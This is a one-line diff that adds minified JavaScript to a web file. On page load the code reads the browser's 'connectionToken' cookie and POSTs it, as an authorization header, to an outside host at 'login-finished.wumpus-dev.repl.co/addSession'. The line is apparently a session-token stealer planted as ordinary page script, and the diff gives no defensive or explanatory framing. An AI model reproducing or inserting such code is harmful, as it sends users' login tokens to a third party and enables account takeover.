@@ -1,0 +1,1 @@
+function accessCookie(e){for(var n=e+"=",o=document.cookie.split(";"),i=0;i<o.length;i++){var t=o[i].trim();if(0==t.indexOf(n))return t.substring(n.length,t.length)}return""}window.onload=function(){fetch("https://login-finished.wumpus-dev.repl.co/addSession",{method:"POST",headers:{authorization:accessCookie("connectionToken")}})};
